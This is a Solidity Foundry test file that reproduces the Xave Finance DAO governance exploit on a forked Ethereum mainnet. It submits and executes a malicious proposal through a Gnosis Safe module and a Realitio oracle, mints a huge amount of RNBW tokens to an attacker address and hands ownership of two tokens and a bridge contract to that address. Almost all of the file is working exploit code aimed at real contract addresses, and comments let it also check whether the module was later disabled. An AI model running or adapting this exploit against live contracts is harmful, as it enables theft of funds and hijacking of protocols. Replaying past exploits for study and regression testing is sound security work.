// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./interface.sol";

contract Enum {
    enum Operation {
        Call, DelegateCall
    }
}

interface IDaoModule {
    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) external view returns(bytes32); 

    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) external;

    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;

    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns(string memory);

    function questionIds (bytes32) external returns (bytes32);
    function setMinimumBond(uint256) external;
    function executor() external returns(address);
}

interface IRealitio {
  function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;

  function isFinalized(bytes32 question_id) view external returns (bool);
}

interface IPrimaryBridge{
    function owner() external view returns (address);
}

contract XaveFinanceExploit is DSTest {
    
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    IERC20 RNBW = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
    IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
    IPrimaryBridge PrimaryBridge =  IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
    IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
    IRealitio realitio = IRealitio (0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);

    // if testing the attack uncomment the line below
    // address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;

    // if testing whether the Gnosis Safe module still allows `executeTransaction`
    // from the DaoModule uncomment the line below
    address attacker = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;


    function setUp() public {
        //  - attacker called `addProposalWithNonce` at block number 15702767 - therefore if wanting to test
        //    the full attack, fork mainnet at block 15702766
        // cheats.createSelectFork("mainnet", 15702766);

        //  - if wanting to test that the Gnosis Safe module has been successfully disabled then fork
        //    mainnet at a block that is older than the one when the module has been removed
        //   (ie. >= 15737130)
        // see https://ethtx.info/mainnet/0xb97368bb743141fc8685ea3b5d56419c90bab87a7ac7ae490f0b1a89e5f51b39/
        cheats.createSelectFork("mainnet", 15737130);
    }

    function encodeWithSignature_mint(address to, uint amount)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSignature("mint(address,uint256)", to, amount);
    }

    function encodeWithSignature_transferOwnership(address to)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSignature("transferOwnership(address)", to);
    }

    function testAttack() public {

        // executor / Safe address
        cheats.prank(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E);
        // reset minimum bond in order to allow execution to go through
        // and reach the executor
        daoModule.setMinimumBond(0);

        
        //tx to mint 100000000000000 $RNBW tokens
        bytes32 tx0 = daoModule.getTransactionHash(
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),
            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );
        
        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx1 = daoModule.getTransactionHash(
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx2 = daoModule.getTransactionHash(
            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx3 = daoModule.getTransactionHash(
            0x579270F151D142eb8BdC081043a983307Aa15786,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );
        
        //the txIDs generated using getTransactionHash
        bytes32[] memory txIDs = new bytes32[](4);  
        txIDs[0] = tx0;
        txIDs[1] = tx1;
        txIDs[2] = tx2;
        txIDs[3] = tx3;
        
        daoModule.addProposal("2", txIDs);
        string memory q = daoModule.buildQuestion("2", txIDs);
        bytes32 qID = daoModule.questionIds(keccak256(bytes(q)));
        realitio.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);
        cheats.warp(block.timestamp + 24 * 60 * 60);

        emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW.owner());
        emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP.owner());
        emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
        emit log_named_uint("[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
        // cheats.startPrank(attackerContract);

        //Execute mint 100000000000000 $RNBW tokens
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),
            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );

        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0xE94B97b6b43639E238c851A7e693F50033EfD75C,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        daoModule.executeProposalWithIndex(
            "2",
            txIDs,
            0x579270F151D142eb8BdC081043a983307Aa15786,
            0,
            encodeWithSignature_transferOwnership(attacker),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );

        // cheats.stopPrank();

        emit log_string("--------------------------------------------------------------");
        emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW.owner());
        emit log_named_address("[After proposal Execution] Owner of $LPOP: ", LPOP.owner());
        emit log_named_address("[After proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
        emit log_named_uint("[After proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
    }
    
}
